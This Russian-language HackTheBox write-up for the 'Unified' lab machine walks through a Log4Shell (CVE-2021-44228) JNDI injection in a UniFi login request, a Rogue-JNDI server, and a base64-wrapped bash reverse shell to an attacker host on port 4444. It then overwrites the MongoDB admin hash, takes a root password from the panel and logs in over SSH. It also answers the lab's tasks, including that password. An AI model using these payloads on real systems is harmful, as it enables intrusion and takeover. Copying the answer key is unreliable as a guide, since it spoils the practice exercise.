# HackTheBox - Unified

## Краткая сводка (Summary)
* **Целевая ОС:** Linux (Ubuntu)
* **Вектор входа:** Обнаружение панели управления UniFi Network Controller -> Эксплуатация уязвимости Log4Shell (CVE-2021-44228) через подмену JSON-параметра в Burp Suite -> Получение первоначального доступа через Rogue-JNDI.
* **Повышение привилегий (Privilege Escalation):**
    * **Горизонтальное:** Подключение к локальной базе данных MongoDB -> Извлечение и подмена SHA-512 хэша пароля администратора -> Вход в веб-панель -> Извлечение root-пароля из настроек SSH-аутентификации устройств.
    * **Вертикальное:** Прямое подключение по SSH с полученным паролем суперпользователя.

---

## Разведка и Анализ

### Сканирование портов
Начинаю с быстрого сканирования портов и обнаруженных сервисов:
```bash
nmap -sC -sV [ip Unified]
```

### Результат
```text
PORT     STATE    SERVICE         VERSION
22/tcp   open     ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
53/tcp   filtered domain
6789/tcp open     ibm-db2-admin?
8080/tcp open     http            Apache Tomcat (language: en)
|_http-title: Did not follow redirect to https://[ip Unified]:8443/manage
8443/tcp open     ssl/nagios-nsca Nagios NSCA
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
|_http-title: UniFi Network
```

**Task 1: Which are the first four open ports?**
* **Ответ:** `22,6789,8080,8443` Ответ берем с вышеуказанного отчёта

**Task 2: What is the title of the software that is running running on port 8443?**
* **Ответ:** `UniFi Network` Наименование указано в названии вкладки

**Task 3: What is the version of the software that is running?**
* Переходим в браузере по адресу `https://[ip Unified]:8443/`. На странице авторизации UniFi Network Controller фиксируем точную версию.
* **Ответ:** `6.4.54`

**Task 4: What is the CVE for the identified vulnerability?**
* **Ответ:** `CVE-2021-44228` *(Критическая уязвимость Log4Shell в Java-библиотеке логирования Log4j)*.

---

## Получение первоначального доступа (Initial Access)

### Тестирование уязвимости (Диагностика)
1. Включаем перехват трафика в Burp Suite, вводим случайные данные на странице авторизации сайта и ловим входящий `POST`-запрос на эндпоинт `/api/login`. Данные передаются в формате JSON. Отправляем запрос в Repeater (`Ctrl + R`).
2. В процессе тестирования блайнд-инъекции (вслепую) выясняется, что сервер не логирует параметр `username`, но успешно отправляет в логгер некорректный тип данных в поле `"remember"`.
3. Запускаем на машине Kali Linux утилиту `tcpdump` на интерфейсе `tun0` для проверки обратных пакетов:
   ```bash
   sudo tcpdump -i tun0 port 389 or icmp
   ```

**Task 5: What protocol does JNDI leverage in the injection?**
* **Ответ:** `LDAP`

**Task 6: What tool do we use to intercept the traffic, indicating the attack was successful?**
* **Ответ:** `tcpdump`

**Task 7: What port do we need to inspect intercepted traffic for?**
* **Ответ:** `389`

4. В Burp Suite подставляем тестовый payload в поле `"remember"` и нажимаем Send:
   ```json
   "remember": "${jndi:ldap://[ip Kali]:389/test}"
   ```
   В терминале с `tcpdump` фиксируем успешный входящий «стук» от сервера по протоколу LDAP на порт 389. Уязвимость подтверждена.

### Эксплуатация Log4Shell
5. Для полноценной эксплуатации скачиваем и собираем утилиту **Rogue-JNDI** на Kali Linux:
   ```bash
   git clone https://github.com/veracode-research/rogue-jndi
   cd rogue-jndi
   mvn clean package
   ```
6. Генерируем команду для Reverse Shell и кодируем ее в Base64, чтобы обойти ограничения Java на обработку спецсимволов (`/dev/tcp` и пайпы):
   ```bash
   echo -n "bash -i >& /dev/tcp/[IP атакующей машины]/4444 0>&1" | base64
   ```
7. Запускаем сервер Rogue-JNDI, передав ему закодированную строку шелла, IP атакующей машины и порт прослушивания LDAP (`1389`):
   ```bash
   java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,[Закодированная строка в Base64]}|{base64,-d}|{bash,-i}" --hostname "[IP атакующей машины]" --ldapPort 1389
   ```
8. В отдельном окне терминала Kali запускаем слушатель Netcat:
   ```bash
   nc -lvnp 4444
   ```
9. В Burp Suite Repeater отправляем финальный payload на эндпоинт `/api/login`, указывая эндпоинт обхода для Tomcat (`/o=tomcat`):
    ```json
    "remember": "${jndi:ldap://[IP атакующей машины]:1389/o=tomcat}"
    ```
10. На стороне Rogue-JNDI видим отправку payload `javax.el.ELProcessor`, а в окне Netcat успешно ловим интерактивную сессию и закрепляемся в системе под пользователем `unifi`.
11. Переходим в директорию `/home/michael` и забираем флаг пользователя.
* **Команда:** `cat /home/michael/user.txt`


---

## Горизонтальное повышение привилегий (User Escalation)

### Ход выполнения:
1. Исследуем запущенные в системе процессы и находим локальную базу данных MongoDB:
   ```bash
   ps aux | grep mongo
   ```

**Task 9: What port is the MongoDB service running on?**
* **Ответ:** `27117` *(Вывод процессов показал параметры `--port 27117 --bind_ip 127.0.0.1`)*.

2. Подключаемся к базе данных напрямую через встроенный клиент:
   ```bash
   mongo --port 27117
   ```

**Task 10: What is the default database name for UniFi applications?**
* В консоли MongoDB проверяем доступные базы данных через команду `show dbs` и находим основную БД.
* **Ответ:** `ace`

3. Переключаемся на нужную базу данных и смотрим доступные коллекции (таблицы):
   ```javascript
   use ace
   show collections
   ```

**Task 11: What is the function we use to enumerate users within the database in MongoDB?**
* Изучаем записи в таблице администраторов.
* **Ответ:** `db.admin.find()`

4. Выводим содержимое коллекции в читаемом формате:
   ```javascript
   db.admin.find().forEach(printjson);
   ```
   Находим пользователя с именем `administrator` и хэшем его пароля SHA-512 в поле `x_shadow`.

**Task 12: What is the function we use to update users within the database in MongoDB?**
* **Ответ:** `db.admin.update()`

5. Открываем терминал на атакующей машине и создаем эталонный хэш для нового пароля, например `password123`:
   ```bash
   mkpasswd -m sha-512 password123
   ```
6. Возвращаемся в консоль MongoDB и перезаписываем хэш администратора созданной строкой:
   ```javascript
   db.admin.update({"name": "administrator"}, {$set: {"x_shadow": "[Новый хэш, созданный на предыдущем шаге]"}})
   ```
   База данных должна вернуть статус успешной модификации: `WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })`.
7. Возвращаемся в браузер на страницу `https://[ip Unified]:8443/` и успешно входим в панель управления под учетной записью `administrator` и паролем `password123`.
8. Переходим в меню **Settings** (шестеренка в левом нижнем углу) -> раздел **Site** и прокручиваем страницу до конца вниз до блока **Device Authentication**.
9. Кликаем на значок отображения скрытых символов в поле пароля (или используем «Исследовать элемент» в браузере) и забираем пароль администратора устройств в открытом виде.

**Task 13: What is the password for the root user?**
* **Ответ:** `NotACrackablePassword4U2022`

---

## Вертикальное повышение привилегий (Root Escalation)

### Ход выполнения:
1. Так как пароль для управления сетевыми устройствами по SSH совпадает с главным паролем суперпользователя на самом Linux-сервере, открываем новый терминал на атакующей машине и подключаемся напрямую по SSH:
   ```bash
   ssh root@[ip Unified]
   ```
2. Вводим найденный пароль `NotACrackablePassword4U2022`.
3. Успешно авторизуемся в системе под пользователем `root`, проверяем домашнюю директорию и читаем финальный флаг машины:
   ```bash
   whoami
   cd /root
   ls -la
   cat root.txt
   ```
